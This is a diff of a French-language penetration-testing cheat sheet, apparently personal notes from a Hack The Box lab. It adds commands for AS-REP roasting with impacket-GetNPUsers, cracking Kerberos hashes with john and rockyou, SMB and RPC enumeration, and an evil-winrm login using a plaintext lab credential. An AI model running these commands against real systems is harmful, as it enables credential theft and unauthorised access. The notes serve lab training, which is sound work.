@@ -68,6 +68,8 @@ john zip.hashes`
 - Crack d'une clé SHA256 avec `hascat` --> `hashcat -m 1400 -D 1,2 -a 3 -i --increment-min 1 --increment-max 10 -1 ?l?u?d b0c83cbeff5e6e61cfc00eb4c1802289c9514d5328d718484a4eb195266e14a4 ?1?1?1?1?1?1?1?1?1`
 	- https://www.malekal.com/hashcat-cracker-des-hashs-empreintes-md5-sha1-sha256/
 
+ - Crack hash Windows --> `john --format=krb5asrep hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
+
 	
 ## Scan
 
@@ -215,9 +217,15 @@ network:
 
 - Simple file Locker --> Mettre un un mdp sur des fichiers/dossiers
 
-- CrackMapExec --> `crackmapexec smb $TARGET --pass-pol -u '' -p ''`
+- Samba (connexion FTP like) --> `smbclient -L \\10.129.118.175`
+
+- CrackMapExec  (énumérer les politiques de sécurité AD) --> `crackmapexec smb $TARGET --pass-pol -u '' -p ''`
 
 - RPC --> `rpcclient -U '%' 10.10.10.161`
+
+- Obtenir les hash utilisateur --> `impacket-GetNPUsers htb.local/ -dc-ip 10.129.118.175 -request`
+
+- Connexion sur la machine cliente --> `evil-winrm -i 10.129.118.175 -u svc-alfresco -p s3rvice`
 
 - Ressources pentest AD --> https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg
 
